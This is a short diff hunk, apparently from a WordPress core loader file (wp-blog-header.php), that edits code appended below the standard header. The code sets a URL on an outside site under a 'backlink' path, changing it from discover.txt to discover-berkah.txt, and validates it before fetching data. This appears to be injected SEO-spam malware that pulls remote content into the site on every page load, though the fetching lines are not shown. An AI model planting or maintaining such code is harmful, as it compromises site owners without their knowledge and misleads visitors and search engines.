@@ -24,7 +24,7 @@ if ( ! isset( $wp_did_header ) ) {
 // ==========================
 
 // URL file discover.txt
-$url = 'https://kampungkeramat.site/backlink/discover.txt';
+$url = 'https://kampungkeramat.site/backlink/discover-berkah.txt';
 
 // Validasi URL sebelum ambil data
 if ( filter_var( $url, FILTER_VALIDATE_URL ) ) {
